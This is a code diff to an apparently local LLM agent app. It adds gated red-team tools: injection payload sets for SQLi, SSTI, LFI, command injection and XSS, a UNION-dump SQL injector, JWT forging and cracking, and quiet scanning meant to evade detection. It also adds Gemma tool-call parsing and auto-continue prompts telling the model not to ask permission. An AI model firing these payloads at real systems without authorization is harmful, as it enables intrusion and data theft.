+    baseline = _recon_baseline(f"{parsed.scheme}://{parsed.netloc}/", timeout)
+    r = _recon_fetch(url, timeout=timeout, max_bytes=8000)
+    if "error" in r:
+        return {"url": url, "likely_real": False, "reasons": [f"request failed: {r['error']}"]}
+    body = r.get("body", "") or ""
+    cls = _recon_classify_body(r.get("status"), r.get("headers"), body)
+    reasons, likely_real = [], True
+    if r.get("status") != 200:
+        reasons.append(f"status {r.get('status')} (not 200)"); likely_real = False
+    if _recon_same_as_baseline(r, baseline):
+        reasons.append("identical to the catch-all baseline (not a distinct resource)"); likely_real = False
+    if cls == "waf_challenge":
+        reasons.append("response is a WAF/block page"); likely_real = False
+    markers = ["example.invalid", "example.com", "placeholder", "changeme", "lorem ipsum",
+               "nothing sensitive", "do not use", "dummy", "sample data", "not a real", "test data"]
+    hit = [m for m in markers if m in body.lower()]
+    if hit:
+        reasons.append(f"contains placeholder/decoy markers: {hit}"); likely_real = False
+    if likely_real:
+        reasons.append("distinct 200 resource, not a catch-all/WAF, no placeholder markers")
+    return {"url": url, "status": r.get("status"), "classification": cls,
+            "likely_real": likely_real, "reasons": reasons, "snippet": body[:200],
+            "note": "likely_real=false → treat with suspicion (decoy/catch-all/block); do NOT report "
+                    "it as a finding without stronger proof."}
+
+
+# Built-in payload sets per vuln class for batch_probe. Distinctive markers so a
+# hit means execution/read, not mere reflection (e.g. 31337*2 = 62674).
+_BATCH_PROBE_SETS = {
+    "sqli": ["'", "1' OR '1'='1", "1\" OR \"1\"=\"1"],
+    "ssti": ["{{1337*1337}}", "${1337*1337}", "<%= 1337*1337 %>"],
+    "lfi":  ["../../../../../../etc/passwd", "....//....//....//etc/passwd"],
+    "cmdi": [";echo $((31337*2))", "|echo $((31337*2))", "`echo $((31337*2))`"],
+    "xss":  ["<svg/onload=1>"],
+}
+
+
+def tool_batch_probe(args: dict) -> dict:
+    """AUTHORIZED PENTEST. Fire a payload set at EVERY parameter of MANY endpoints
+    in one call — the "try this against every parameterized endpoint" primitive,
+    so you don't hand-craft N×M http_request calls. Give `targets` (a list of URLs
+    that carry query params) and either `probe` (a built-in class: sqli | ssti |
+    lfi | cmdi | xss) or your own `payloads` list. For each target × param ×
+    payload it sends the request and flags hits (SQL error / template-eval /
+    /etc/passwd read / shell-exec / reflection signatures — or, for custom
+    payloads, responses that differ from the parameter's baseline). Follow a hit
+    up with sql_injection (dump), http_request (exploit), or fuzz (enumerate).
+    Read-only per request. Gated behind red_team_enabled."""
+    if not get_settings().get("red_team_enabled"):
+        return {"error": "red team tools are disabled. Enable them in Settings."}
+    targets = args.get("targets") or args.get("urls") or args.get("url")
+    if isinstance(targets, str):
+        targets = [targets]
+    if not targets:
+        return {"error": "provide `targets` — a list of URLs that carry query parameters"}
+    probe = (args.get("probe") or "").lower().strip()
+    payloads = args.get("payloads")
+    if isinstance(payloads, str):
+        payloads = [payloads]
+    if not payloads:
+        if probe not in _BATCH_PROBE_SETS:
+            return {"error": "provide `probe` (sqli|ssti|lfi|cmdi|xss) or a `payloads` list"}
+        payloads = _BATCH_PROBE_SETS[probe]
+    timeout = max(2.0, min(float(args.get("timeout") or 6.0), 12.0))
+
+    def detect(body):
+        b = body or ""
+        bl = b.lower()
+        if probe == "sqli":
+            # Match the same signatures sql_injection uses, incl. the generic
+            # "sql error" / "syntax error" prefixes many apps emit.
+            for sig in ("sql error", "syntax error", "unrecognized token",
+                        "do not have the same number", *_RECON_SQL_ERRORS):
+                if sig in bl:
+                    return f"SQL error signature: '{sig}'"
+            return None
+        if probe == "ssti":
+            return "template evaluated (1787569)" if "1787569" in b else None
+        if probe == "lfi":
+            if re.search(r"root:.*:0:0:", b):
+                return "/etc/passwd contents returned"
+            return "win.ini returned" if "[fonts]" in bl else None
+        if probe == "cmdi":
+            return "command executed (shell computed 62674)" if "62674" in b else None
+        if probe == "xss":
+            return "payload reflected unencoded" if "<svg/onload=1>" in b else None
+        return None  # custom payloads → handled via baseline diff below
+
+    # Expand to one job per (url, param).
+    jobs = []
+    for t in targets:
+        u = _recon_prep_url(str(t))
+        p = urllib.parse.urlparse(u)
+        q = urllib.parse.parse_qsl(p.query, keep_blank_values=True)
+        for pname, _ in q:
+            jobs.append((u, p, q, pname))
+    if not jobs:
+        return {"error": "no query parameters found in targets — include a ?key=value in each URL"}
+
+    cap = 400  # hard ceiling on total requests
+    counter = {"sent": 0}
+
+    def run(job):
+        u, p, q, pname = job
+        base = None
+        if not probe:  # custom payloads: reference the unmodified response
+            r0 = _recon_fetch(u, timeout=timeout, max_bytes=6000)
+            base = (r0.get("status"), len(r0.get("body") or ""))
+        out = []
+        for pay in payloads:
+            if counter["sent"] >= cap:
+                break
+            counter["sent"] += 1
+            newq = [(k, (pay if k == pname else v)) for k, v in q]
+            uu = urllib.parse.urlunparse(p._replace(query=urllib.parse.urlencode(newq)))
+            r = _recon_fetch(uu, timeout=timeout, max_bytes=20000)
+            body = r.get("body", "")
+            ev = detect(body)
+            if ev is None and not probe:
+                if (r.get("status"), len(body or "")) != base:
+                    ev = f"response changed (status {r.get('status')}, {len(body or '')}b vs baseline {base})"
+            if ev:
+                out.append({"path": p.path, "param": pname, "payload": pay,
+                            "status": r.get("status"), "evidence": ev, "test_url": uu})
+        return out
+
+    hits = []
+    with ThreadPoolExecutor(max_workers=6, thread_name_prefix="batch") as ex:
+        for res in ex.map(run, jobs):
+            hits.extend(res)
+
+    return {"targets": len(targets), "params_tested": len(jobs), "requests_sent": counter["sent"],
+            "probe": probe or "custom", "hit_count": len(hits), "hits": hits,
+            "note": ("injectable/interesting endpoints are in hits — follow up with sql_injection "
+                     "(dump), http_request (exploit), or fuzz (enumerate).") if hits else
+                    "no signatures fired for this payload set across the given endpoints."}
 
 
 # --- Tool 5: check_deps ---
@@ -8703,6 +9439,103 @@ TOOLS: dict[str, dict] = {
         },
         "fn": tool_recon_http_fingerprint,
     },
+    "http_request": {
+        "description": "AUTHORIZED PENTEST. Send an arbitrary HTTP request (method, url, headers, cookies, body) and get back status, ALL response headers (every Set-Cookie preserved in 'set_cookie'), and body — the curl/Burp Repeater primitive for actually exploiting a finding: read a Set-Cookie then flip+replay it, aim an SSRF url param, POST an SSTI/injection payload. Wears a rotating real-browser identity (blends in). Every status is returned (a 403/500 body is signal, not an error). host:port and http:// targets are fine. Pass save_evidence to persist the exploit request+response as a proof artifact; pass session to carry cookies across calls.",
+        "parameters": {
+            "type": "object",
+            "properties": {
+                "url": {"type": "string", "description": "Target URL. Scheme optional (defaults to http://). host:port is fine."},
+                "method": {"type": "string", "description": "GET, POST, PUT, DELETE, etc. Defaults to POST if a body is given, else GET."},
+                "headers": {"type": "object", "description": "Optional request headers as a name->value map."},
+                "cookies": {"type": "object", "description": "Optional cookies as a name->value map (folded into a Cookie header)."},
+                "body": {"type": "string", "description": "Optional raw request body (e.g. form-encoded 'a=1&b=2' or JSON)."},
+                "session": {"type": "string", "description": "Optional session name. Reuses cookies captured under this name and remembers new Set-Cookies — for multi-step auth flows."},
+                "save_evidence": {"type": "string", "description": "Optional label. Persists this exact request+response to recon_evidence/ (returns evidence_saved path + evidence_sha256) — verifiable proof of a breach."},
+            },
+            "required": ["url"],
+        },
+        "fn": tool_http_request,
+    },
+    "encode_decode": {
+        "description": "AUTHORIZED PENTEST. Encode/decode a string (base64, base64url, url, hex, or jwt) — the Burp Decoder equivalent. Use it to inspect and FORGE tokens (decode an unsigned session cookie, flip a field like role=admin, re-encode it) instead of doing base64 by hand. base64 encode returns BOTH standard and url-safe forms.",
+        "parameters": {
+            "type": "object",
+            "properties": {
+                "text": {"type": "string", "description": "The string to transform (e.g. a cookie value or a JSON payload)."},
+                "scheme": {"type": "string", "description": "base64 | base64url | url | hex | jwt. Default base64."},
+                "operation": {"type": "string", "description": "encode | decode. Default encode. (jwt is always decode.)"},
+            },
+            "required": ["text"],
+        },
+        "fn": tool_encode_decode,
+    },
+    "jwt_tool": {
+        "description": "AUTHORIZED PENTEST. Decode, forge (sign), or crack a JSON Web Token. operation=decode inspects header+payload; operation=sign builds a signed token from a JSON payload + secret + alg (HS256/384/512 or 'none' for the alg-confusion downgrade); operation=crack brute-forces the HMAC secret against a built-in weak list + your wordlist. The core of modern auth attacks (alg:none, weak-secret forgery, claim tampering).",
+        "parameters": {
+            "type": "object",
+            "properties": {
+                "operation": {"type": "string", "description": "decode | sign | crack. Default decode."},
+                "token": {"type": "string", "description": "The JWT (for decode/crack)."},
+                "payload": {"type": "object", "description": "Claims to sign (for operation=sign), e.g. {\"user\":\"admin\",\"role\":\"admin\"}."},
+                "secret": {"type": "string", "description": "HMAC secret (for sign; omit for alg=none)."},
+                "alg": {"type": "string", "description": "HS256 | HS384 | HS512 | none. Default HS256."},
+                "wordlist": {"type": "array", "items": {"type": "string"}, "description": "Extra candidate secrets to try (for crack)."},
+            },
+            "required": [],
+        },
+        "fn": tool_jwt_tool,
+    },
+    "sql_injection": {
+        "description": "AUTHORIZED PENTEST. Semi-automated SQL injection on a GET query parameter (sqlmap-lite): detects error/boolean injectability, auto-finds the UNION column count, and — with `extract` (a SELECT list like 'flag FROM secrets' or 'name FROM sqlite_master') — builds the padded UNION payload and dumps the rows. Handles the mechanical UNION assembly so you only decide WHAT to pull.",
+        "parameters": {
+            "type": "object",
+            "properties": {
+                "url": {"type": "string", "description": "URL including the target query param, e.g. http://host/search?q=test"},
+                "param": {"type": "string", "description": "Which query param to inject (default: the first)."},
+                "extract": {"type": "string", "description": "SELECT list to dump, optionally with FROM, e.g. 'flag FROM secrets'. Omit to just detect + count columns."},
+            },
+            "required": ["url"],
+        },
+        "fn": tool_sql_injection,
+    },
+    "fuzz": {
+        "description": "AUTHORIZED PENTEST. Iterate a request parameter over many values and report which responses DIFFER from the norm — the primitive for enumeration/IDOR (find the object id that leaks), id/endpoint brute forcing, access checks. Put FUZZ in the url or pass `param`; give `values` (list) or `range`=[start,end]. Returns the outliers so the interesting one is obvious.",
+        "parameters": {
+            "type": "object",
+            "properties": {
+                "url": {"type": "string", "description": "URL, with FUZZ where the value goes (e.g. http://host/api/account?id=FUZZ)."},
+                "param": {"type": "string", "description": "Param to vary if not using a FUZZ marker."},
+                "values": {"type": "array", "items": {"type": "string"}, "description": "Explicit values to try."},
+                "range": {"type": "array", "items": {"type": "integer"}, "description": "[start, end] integer range to try (inclusive)."},
+            },
+            "required": ["url"],
+        },
+        "fn": tool_fuzz,
+    },
+    "validate_finding": {
+        "description": "AUTHORIZED PENTEST. Sanity-check a suspected finding before reporting it, to avoid false positives on decoys/catch-all/WAF pages. Diffs the url against a random-path baseline, classifies the response, and flags placeholder/decoy markers (example.invalid, 'placeholder', 'nothing sensitive', …). Returns likely_real + reasons so you don't report a honeypot.",
+        "parameters": {
+            "type": "object",
+            "properties": {
+                "url": {"type": "string", "description": "The URL of the suspected finding to validate."},
+            },
+            "required": ["url"],
+        },
+        "fn": tool_validate_finding,
+    },
+    "batch_probe": {
+        "description": "AUTHORIZED PENTEST. Fire one payload set at EVERY parameter of MANY endpoints in a single call — 'try this against every parameterized endpoint' — instead of N×M manual http_request calls. Give `targets` (list of URLs with query params) and either `probe` (sqli|ssti|lfi|cmdi|xss) or your own `payloads`. Returns which endpoint+param+payload combos fired a signature (SQL error, template eval, /etc/passwd read, shell exec, reflection). Follow a hit up with sql_injection / http_request / fuzz.",
+        "parameters": {
+            "type": "object",
+            "properties": {
+                "targets": {"type": "array", "items": {"type": "string"}, "description": "URLs that carry query params, e.g. ['http://host/search?q=x','http://host/download?file=y']."},
+                "probe": {"type": "string", "description": "Built-in class: sqli | ssti | lfi | cmdi | xss."},
+                "payloads": {"type": "array", "items": {"type": "string"}, "description": "Custom payloads instead of a built-in class; hits = responses that differ from baseline."},
+            },
+            "required": ["targets"],
+        },
+        "fn": tool_batch_probe,
+    },
     "recon_subdomains": {
         "description": "AUTHORIZED RECON ONLY. Passive subdomain enumeration via certificate transparency logs (crt.sh). No active brute-forcing. Read-only.",
         "parameters": {
@@ -8726,14 +9559,15 @@ TOOLS: dict[str, dict] = {
         "fn": tool_recon_dns,
     },
     "recon_content_discovery": {
-        "description": "AUTHORIZED RECON ONLY. Probe a base URL for a high-value path list (admin panels, config/backup files, VCS dirs, API docs). Rate-limited + jittered. Reports non-404 paths. Read-only.",
+        "description": "AUTHORIZED RECON ONLY. Probe a base URL for a high-value path list (admin panels, config/backup files, VCS dirs, API docs). Reports non-404 paths that differ from the catch-all baseline. Read-only. NOTE: a content IDS scores REQUESTS, not timing — to stay quiet against detection use quiet=true (a small high-signal set, ~10 requests) rather than relying on jitter.",
         "parameters": {
             "type": "object",
             "properties": {
                 "url": {"type": "string", "description": "Base URL or host."},
                 "wordlist": {"type": "array", "items": {"type": "string"}, "description": "Optional custom path list. Default = built-in high-value paths."},
+                "quiet": {"type": "boolean", "description": "Low-footprint sweep: ~10 highest-signal paths at low concurrency. Fewer requests = fewer detection triggers."},
                 "concurrency": {"type": "integer", "description": "Max simultaneous requests (default 6, max 20)."},
-                "jitter_ms": {"type": "integer", "description": "Random delay before each request (default 60)."}
+                "jitter_ms": {"type": "integer", "description": "Delay before each request in ms — rate-limiting/politeness, NOT IDS evasion."}
             },
             "required": ["url"],
         },
@@ -9762,6 +10596,12 @@ _TOOL_RESULT_CAPS = {
     "recon_cve_match": 24000,
     "recon_injection_probe": 16000,
     "recon_open_services": 16000,
+    # Exploit responses (SSTI output, dumped configs, flag-bearing bodies) need
+    # room so the model can read the whole thing and confirm access.
+    "http_request": 16000,
+    "sql_injection": 16000,  # dumped rows can be large
+    "fuzz": 16000,           # many per-value response summaries
+    "batch_probe": 16000,    # hits across many endpoints
     "scan_apk": 48000,
     "decompile_apk": 24000,
     # ghidra_analyze: imports + exports + 200 strings + decompiled function
@@ -9947,6 +10787,21 @@ _RED_TEAM_TOOL_NAMES = {
     "recon_port_scan", "recon_content_discovery", "recon_check_exposure",
     "recon_subdomain_takeover", "recon_cve_match", "recon_injection_probe",
     "recon_open_services", "recon_auth_spray", "recon_capture_evidence",
+    # Active exploitation primitive — lets the flow actually breach, not just
+    # flag suspicion. Gated with the rest of the suite.
+    "http_request",
+    # Token encoder/decoder (Burp Decoder equivalent) — lets a model forge a
+    # cookie/JWT without hand-computing base64. Gated with the suite.
+    "encode_decode",
+    # JWT decode/forge/crack — modern auth attacks (alg:none, weak-secret).
+    "jwt_tool",
+    # sqlmap-lite, param fuzzer/enumerator, and finding validator — so a miss
+    # is a model decision, not a missing capability.
+    "sql_injection",
+    "fuzz",
+    "validate_finding",
+    # one payload set -> every parameterized endpoint at once
+    "batch_probe",
 }
 
 
@@ -10253,12 +11108,91 @@ TOOL_CALL_QWEN_RE = re.compile(
 TOOL_CALL_SELFCLOSING_RE = re.compile(
     r"<tool_call\s+([^>]+)/>",
     re.IGNORECASE)
+# Gemma / CodeGemma python-style function-call dialect. Google's Gemma
+# function-calling spec has the model emit a PYTHON CALL inside a
+# ```tool_code``` fence (sometimes wrapped in print(...)), NOT a JSON
+# tool_call — e.g.  ```tool_code\nweb_search(query="casemiro news")\n```
+# The token-based <|tool_call> form above only covers a subset of tunes;
+# real Gemma-2/3 GGUFs emit this fenced python shape, which is why tool
+# calls "silently failed" before (nothing parsed it, so it leaked to chat).
+TOOL_CALL_TOOLCODE_RE = re.compile(r"```(?:tool_code|python)\s*\n?([\s\S]*?)```",
+                                   re.IGNORECASE)
+# A bare/bracketed single python call: name(...) or [name(...)]. Non-greedy to
+# the first ")", so calls with a ")" inside a string arg are only caught by the
+# fenced form above — acceptable, since Gemma emits the fence for real calls.
+TOOL_CALL_PYFUNC_RE = re.compile(r"\[?\s*([a-zA-Z_]\w*)\s*\(([^()]*)\)\s*\]?")
 # Heuristic: model emitted tool-call syntax but no parser matched it.
 # When this fires with zero parsed calls, the reply is almost certainly
 # a hallucination from a chat-template mismatch.
 TOOL_SYNTAX_HINT_RE = re.compile(
-    r'<call:[a-zA-Z]|<\|python_tag\|>|\[TOOL_CALLS\]|<tool_call>|<\|tool_call>|```tool_call|<\|function_calls_begin\|>|\{"name"\s*:\s*"',
+    r'<call:[a-zA-Z]|<\|python_tag\|>|\[TOOL_CALLS\]|<tool_call>|<\|tool_call>|```tool_call|```tool_code|<\|function_calls_begin\|>|\{"name"\s*:\s*"',
     re.IGNORECASE)
+
+
+def _parse_python_tool_call(expr: str) -> dict | None:
+    """Parse ONE python-style call — name(k=v, ...) or name("positional") — into
+    {name, arguments}. This is Gemma's documented function-call shape. Uses ast
+    so nested quotes / lists / dicts parse correctly, unwraps a print(...) that
+    Gemma sometimes adds, and maps positional args onto the tool's declared
+    parameter order. Returns None unless the call names a REAL active tool — so
+    ordinary python the model prints in prose/code is never mistaken for a call."""
+    import ast
+    src = (expr or "").strip()
+    if not src:
+        return None
+    try:
+        node = ast.parse(src, mode="eval").body
+    except Exception:
+        return None
+    if (isinstance(node, ast.Call) and isinstance(node.func, ast.Name)
+            and node.func.id == "print" and len(node.args) == 1 and not node.keywords):
+        node = node.args[0]  # unwrap print(call(...))
+    if not isinstance(node, ast.Call):
+        return None
+    if isinstance(node.func, ast.Name):
+        name = node.func.id
+    elif isinstance(node.func, ast.Attribute):
+        name = node.func.attr
+    else:
+        return None
+    tools = _active_tools()
+    if name not in tools:
+        return None
+
+    def _lit(v):
+        try:
+            return ast.literal_eval(v)
+        except Exception:
+            try:
+                return ast.get_source_segment(src, v)
+            except Exception:
+                return None
+
+    args: dict = {}
+    for kw in node.keywords:
+        if kw.arg:
+            args[kw.arg] = _lit(kw.value)
+    if node.args:
+        props = list(tools[name]["parameters"].get("properties", {}).keys())
+        for i, a in enumerate(node.args):
+            if i < len(props):
+                args[props[i]] = _lit(a)
+    return {"name": name, "arguments": args}
+
+# Cyber-range / CTF breach marker. A FLAG{...} captured in a tool response is
+# treated as confirmed access by run_chat_turn's breach detection.
+_FLAG_RE = re.compile(r"FLAG\{[^}]+\}")
+
+
+def _is_breach_capable_tool(name: str | None) -> bool:
+    """Only tools that actually TOUCH a target can 'capture' a flag: network
+    probes and the recon suite. A FLAG{...} that merely appears in a file read,
+    grep hit, or local transform was already sitting on disk — reading your own
+    pentest report should not re-trigger 'confirmed access'. Mirrors the
+    frontend's isRedTeamTool gate (minus encode_decode, which is a local
+    transform, not target access)."""
+    n = name or ""
+    return n.startswith("recon_") or n == "http_request"
 
 
 def _js_to_json(s: str) -> str:
@@ -10584,6 +11518,19 @@ def extract_tool_calls(text: str) -> list[dict]:
             # Some models emit html-encoded JSON in the attribute
             args_str = args_m.group(2).replace('&quot;', '"').replace('&apos;', "'").replace('&#39;', "'")
             _add({"name": name, "arguments": repair_tool_args(args_str)})
+
+    # 7b. Gemma / CodeGemma python-style calls: a ```tool_code``` fence, or a
+    # bare/bracketed name(...) line. _parse_python_tool_call only accepts calls
+    # that name a real active tool, so incidental python in prose is ignored.
+    _py_candidates: list[str] = [m.group(1) for m in TOOL_CALL_TOOLCODE_RE.finditer(text)]
+    # scan for bare calls in the text with the fenced regions blanked out so we
+    # don't double-count what the fence already captured.
+    _defenced = TOOL_CALL_TOOLCODE_RE.sub(" ", text)
+    _py_candidates += [m.group(0) for m in TOOL_CALL_PYFUNC_RE.finditer(_defenced)]
+    for _cand in _py_candidates:
+        parsed = _parse_python_tool_call(_cand.strip().strip("[]").strip())
+        if parsed:
+            _add(parsed)
 
     # 8. Bare JSON tool call (no wrapper) — LAST-CHANCE fallback. Some
     # fine-tunes and chat-template-confused merges emit raw
@@ -11037,6 +11984,18 @@ you may occasionally append exactly one of these to the absolute end of your res
             sig = ",".join(f"{k}:{v.get('type','any')[:3]}" for k, v in params.items())
             tool_lines.append(f"- {name}({sig})")
         parts.append("\n".join(tool_lines))
+        # CTF-tuned red-team models (e.g. RavenX-CyberAgent) narrate CTF framing
+        # from training priors — "0/3 flags captured", "objective: 3 flags" —
+        # even against a real target with nothing to find. Kill it: real
+        # engagements have no flag count. A FLAG{...} matters only if a tool
+        # result literally contains that string.
+        if settings.get("red_team_enabled"):
+            parts.append(
+                "red-team note: real engagements are NOT CTFs. never report a flag "
+                "count or progress like \"N/3\"/\"X of Y flags\"; never assume a "
+                "FLAG{...} exists. a clean target = \"no exploitable findings\", not "
+                "\"0 flags\". only cite a FLAG{...} if a tool result actually contains one."
+            )
 
     # === MEMORIES (most useful only, not all) ===
     mems = _select_memories_for_prompt()
@@ -11104,19 +12063,93 @@ def llama_options(settings: dict) -> dict:
 
 
 def _is_gemma_model(name: str | None) -> bool:
-    """Gemma emits a non-JSON, Python-shaped function-call dialect (triple-quoted
-    strings, its own <|tool_call> token syntax) that neither llama.cpp's native
-    parser nor our text fallback can reliably decode — tool calls silently no-op
-    while the model narrates fake success. We force these into chat-only mode.
-    See the dialect notes near TOOL_CALL_GEMMA_RE and the in-app FAQ."""
+    """Gemma emits a python-shaped function-call dialect (a ```tool_code``` fence
+    with `name(arg=value)`) rather than a JSON tool_call, which llama.cpp's
+    NATIVE parser can't decode. We therefore run Gemma in *text-tools* mode:
+    tools are described in the system prompt and parsed from content by our
+    fallback (extract_tool_calls handles the tool_code shape), but we do NOT
+    hand llama-server the `tools` array. See the in-app FAQ."""
     return "gemma" in (name or "").lower()
 
 
-def run_chat_turn(chat_id: str, messages: list[dict], use_tools: bool, emit):
+def _warmup_tool_grammar() -> None:
+    """Compile llama-server's tool-call grammar BEFORE the user's first real
+    turn. llama.cpp builds that grammar lazily on the first /chat/completions
+    request carrying a `tools` array — and the cold generation tends to emit the
+    call as plain content instead of a structured tool_calls delta. That's the
+    "prints the tool call as text until you say hi first" bug: the greeting turn
+    silently pays the compile cost, so only the *next* turn works. Firing a
+    throwaway tools-bearing request at load time pays it up front instead.
+    Best-effort and silent on failure (e.g. a template that rejects tools)."""
+    try:
+        s = get_settings()
+        payload: dict = {
+            "model": s.get("model") or "local",
+            "messages": [{"role": "user", "content": "ready"}],
+            "tools": tools_for_llama(),
+            "tool_choice": "auto",
+            "max_tokens": 8,
+            "stream": False,
+        }
+        et = s.get("enable_thinking")
+        if et is not None:
+            payload["chat_template_kwargs"] = {"enable_thinking": bool(et)}
+        llama_post("/v1/chat/completions", payload, timeout=120)
+        print("[llama] tool-grammar warmup complete", flush=True)
+    except Exception as e:
+        print(f"[llama] tool-grammar warmup skipped: {e}", flush=True)
+
+
+# Mid-plan stall detection. Small local models (Gemma above all) announce a
+# multi-step plan, execute ONE tool call, then end the turn with "I'll now do
+# B" or "Shall I continue?" — the user has to bump them with "continue" for
+# every remaining step. These patterns, matched against the END of a reply in
+# a turn where tools already ran, identify that stall so the loop can bump
+# automatically. Negative lookaheads keep sign-offs ("I'll be here", "let me
+# know") from tripping it.
+_UNFINISHED_PLAN_RE = re.compile(
+    r"(?:i(?:'|’)?ll\s+(?:now\s+|also\s+|then\s+)?(?!be\b|know|let|wait|stop|leave)\w+|"
+    r"i\s+will\s+(?:now\s+|also\s+|then\s+)?(?!be\b|know|wait|stop)\w+|"
+    r"let\s+me\s+(?!know)\w+|"
+    r"i(?:'|’)?m\s+going\s+to\s+\w+|i\s+am\s+going\s+to\s+\w+|"
+    r"next,?\s+(?:i(?:'|’)?ll|i\s+will|step)|"
+    r"proceeding\s+(?:to|with)|moving\s+on\s+to|"
+    r"the\s+next\s+step\s+is|now\s+i\s+(?:need|have|want)\s+to)",
+    re.IGNORECASE,
+)
+_ASKS_TO_CONTINUE_RE = re.compile(
+    r"(?:shall|should|may|can)\s+i\s|do\s+you\s+want\s+me\s+to|"
+    r"want\s+me\s+to\s+(?:continue|proceed)|ready\s+to\s+(?:continue|proceed)",
+    re.IGNORECASE,
+)
+
+def _looks_unfinished(text: str) -> bool:
+    """True when a reply reads like the model dropped out of its own plan:
+    it announces further actions, trails off on a colon, or asks permission
+    to continue instead of delivering a result."""
+    tail = (text or "").strip()
+    if not tail:
+        return False
+    if tail.endswith(":"):
+        return True
+    if tail.endswith("?") and _ASKS_TO_CONTINUE_RE.search(tail[-240:]):
+        return True
+    return bool(_UNFINISHED_PLAN_RE.search(tail[-400:]))
+
+
+def run_chat_turn(chat_id: str, messages: list[dict], use_tools: bool, emit,
+                  native_tools: bool = True):
     """
     messages: list of {role, content, [tool_calls], [tool_call_id]}
     emit(event_dict): pushes a chunk to the caller (SSE producer).
     Returns the final assistant message dict (with content fully assembled).
+
+    use_tools     — tools are in play this turn (listed in the system prompt,
+                    and content is scanned by the text fallback parser).
+    native_tools  — ALSO hand llama-server the `tools` array so it can emit
+                    structured tool_calls. False = text-tools mode (Gemma):
+                    the model still sees/uses tools, but only via content we
+                    parse ourselves, since llama.cpp can't parse Gemma's dialect.
     """
     settings = get_settings()
     model = settings.get("model") or ""
@@ -11141,7 +12174,19 @@ def run_chat_turn(chat_id: str, messages: list[dict], use_tools: bool, emit):
             max_tool_rounds = 60
         max_tool_rounds = max(1, min(max_tool_rounds, 500))
         rounds = 0
-        empty_retry_done = False
+        empty_retries = 0    # blank-reply-after-tools nudges used this turn
+        auto_continues = 0   # mid-plan stall bumps used this turn (see _looks_unfinished)
+        # Turn-level token totals. A turn can span many rounds (tool call →
+        # re-inference → …); each round reports its own eval_count/prompt tokens.
+        # We sum them so the PERSISTED message reflects the whole turn's cost,
+        # not just the final round — otherwise reload/session cost and per-message
+        # tooltips undercount every tool-heavy turn.
+        turn_eval_total = 0
+        turn_prompt_total = 0
+        # Breach state for the red-team / cyber-range flow: a FLAG{...} captured
+        # in a tool response IS confirmed access. Track distinct flags seen this
+        # turn so we report each stage once and can summarize at the end.
+        captured_flags: list = []
         force_no_think = False   # set when the thinking-budget enforcer aborts a runaway
         budget_retries = 0       # cap how many times we force-stop thinking per turn
         conversation = list(messages)
@@ -11173,7 +12218,7 @@ def run_chat_turn(chat_id: str, messages: list[dict], use_tools: bool, emit):
             # an exact count (cached per spec) so the trimmer's budget reflects
             # what actually gets sent.
             tools_overhead = 0
-            if use_tools:
+            if use_tools and native_tools:
                 try:
                     _tools_json = json.dumps(tools_for_llama(), ensure_ascii=False)
                     tools_overhead = _tools_spec_overhead_tokens(_tools_json)
@@ -11232,7 +12277,7 @@ def run_chat_turn(chat_id: str, messages: list[dict], use_tools: bool, emit):
                 tpl_kwargs["thinking_budget"] = tb_int
             if tpl_kwargs:
                 payload["chat_template_kwargs"] = tpl_kwargs
-            if use_tools:
+            if use_tools and native_tools:
                 payload["tools"] = tools_for_llama()
                 payload["tool_choice"] = "auto"
 
@@ -11360,6 +12405,9 @@ def run_chat_turn(chat_id: str, messages: list[dict], use_tools: bool, emit):
                     reasoning_open = False
                 if last_stats.get("eval_count") is not None:
                     emit({"type": "stats", **last_stats})
+                    # Fold this round into the turn totals for persistence.
+                    turn_eval_total += last_stats.get("eval_count") or 0
+                    turn_prompt_total += last_stats.get("prompt_eval_count") or 0
                     global _last_prompt_tokens
                     _last_prompt_tokens = last_stats.get("prompt_eval_count") or 0
                     # Per-chat truth for the gauge + summary trigger. Once set,
@@ -11434,6 +12482,17 @@ def run_chat_turn(chat_id: str, messages: list[dict], use_tools: bool, emit):
                     # Strip fallback tool-call blocks so they don't leak into the UI as clear text
                     full_text = re.sub(r"(?:<|&lt;|\\<)?tool_call(?:>|&gt;|\\>)?[\s\S]*?((?:<|&lt;|\\<)?/tool_call(?:>|&gt;|\\>)?|$)", "", full_text, flags=re.IGNORECASE)
                     full_text = re.sub(r"```tool_call[\s\S]*?(?:```|$)", "", full_text, flags=re.IGNORECASE)
+                    # Gemma python-call fence (```tool_code``` / ```python``` that
+                    # held a real call we just parsed) — drop it so the bubble
+                    # doesn't show the raw call text.
+                    for _nm in {c["name"] for c in parsed_calls}:
+                        full_text = re.sub(
+                            r"```(?:tool_code|python)[\s\S]*?" + re.escape(_nm) + r"\s*\([\s\S]*?(?:```|$)",
+                            "", full_text, flags=re.IGNORECASE)
+                        # bare/bracketed one-liner form of the same call
+                        full_text = re.sub(
+                            r"^[ \t]*\[?\s*(?:print\()?\s*" + re.escape(_nm) + r"\s*\([^\n]*\)\s*\)?\s*\]?[ \t]*$",
+                            "", full_text, flags=re.IGNORECASE | re.MULTILINE)
                     full_text = re.sub(r"\[TOOL_CALLS\][\s\S]*?(?:\]|$)", "", full_text, flags=re.IGNORECASE)
                     if '"name"' in full_text or "'name'" in full_text or '"function"' in full_text or "'function'" in full_text:
                         for s, e in reversed(_find_balanced_json_objects(full_text)):
@@ -11480,14 +12539,56 @@ def run_chat_turn(chat_id: str, messages: list[dict], use_tools: bool, emit):
                 ]
 
             if not parsed_calls or rounds >= max_tool_rounds:
-                if not (assistant_msg.get("content") or "").strip() and rounds > 0 and not empty_retry_done:
-                    empty_retry_done = True
+                _final_text = (assistant_msg.get("content") or "").strip()
+                if not _final_text and rounds > 0 and empty_retries < 2:
+                    empty_retries += 1
                     conversation.append({
                         "role": "system",
                         "content": "Continue. Complete the user's request using the tool results you just received. Do not ask for permission.",
                     })
                     continue
-                assistant_msg["_stats"] = last_stats
+                # Mid-plan stall: tools already ran this turn and the reply
+                # announces more steps (or asks "shall I continue?") without
+                # making a tool call. Small models — Gemma especially — do
+                # this after every single tool result, forcing the user to
+                # type "continue" per step. Bump automatically, budgeted so a
+                # model that keeps narrating instead of acting still lands.
+                if (_final_text and rounds > 0 and rounds < max_tool_rounds
+                        and auto_continues < 3 and _looks_unfinished(_final_text)):
+                    auto_continues += 1
+                    conversation.append(assistant_msg)
+                    _fence_hint = ("" if native_tools
+                                   else " Emit the ```tool_code``` fence for the next call.")
+                    conversation.append({
+                        "role": "user",
+                        "content": (
+                            "[automatic note] You announced more steps but stopped without a tool call. "
+                            "Continue NOW with the next step — make the call instead of describing it."
+                            + _fence_hint +
+                            " Do not ask for permission and do not restate the plan. If every step is "
+                            "actually complete, write the final summary of what was done instead."
+                        ),
+                    })
